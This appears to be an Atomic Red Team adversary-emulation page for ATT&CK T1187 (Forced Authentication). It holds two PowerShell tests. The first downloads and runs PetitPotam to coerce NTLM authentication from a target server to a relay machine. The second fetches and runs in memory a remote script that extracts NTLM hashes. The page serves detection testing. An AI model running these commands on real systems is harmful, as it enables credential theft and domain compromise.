---
tags: [T1187, atomic_test]
filename: "[[T1187 - Forced Authentication]]"
---
# T1187 - Forced Authentication

## Atomic Test #1 - PetitPotam
This module runs the Windows executable of PetitPotam in order to coerce authentication for a remote system.

**Supported Platforms:** Windows


**auto_generated_guid:** 485ce873-2e65-4706-9c7e-ae3ab9e14213





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| captureServerIP | Computer IP to use to receive the authentication (ex. attacker machine used for NTLM relay) | string | 10.0.0.3|
| targetServerIP | Computer IP to force authentication from (ex. domain controller) | string | 10.0.0.2|
| efsApi | EFS API to use to coerce authentication | integer | 1|
| petitpotam_path | PetitPotam Windows executable | path | PathToAtomicsFolder&#92;..&#92;ExternalPayloads&#92;PetitPotam.exe|


#### Attack Commands: Run with `powershell`! 


```powershell
& "#{petitpotam_path}" #{captureServerIP} #{targetServerIP} #{efsApi}
Write-Host "End of PetitPotam attack"
```




#### Dependencies:  Run with `powershell`!
##### Description: PetitPotam binary must exist on disk and at specified location (#{petitpotam_path}).
And the computer must be domain joined (implicit authentication).
##### Check Prereq Commands:
```powershell
if (Test-Path "#{petitpotam_path}") { exit 0 } else { exit 1 }
```
##### Get Prereq Commands:
```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://github.com/topotam/PetitPotam/blob/2ae559f938e67d0cd59c5afcaac67672b9ef2981/PetitPotam.exe?raw=true" -OutFile "#{petitpotam_path}"
```




<br/>
<br/>

## Atomic Test #2 - WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS
PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS technique via function of WinPwn

**Supported Platforms:** Windows


**auto_generated_guid:** 7f06b25c-799e-40f1-89db-999c9cc84317






#### Attack Commands: Run with `powershell`! 


```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')
Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true"
```






<br/>
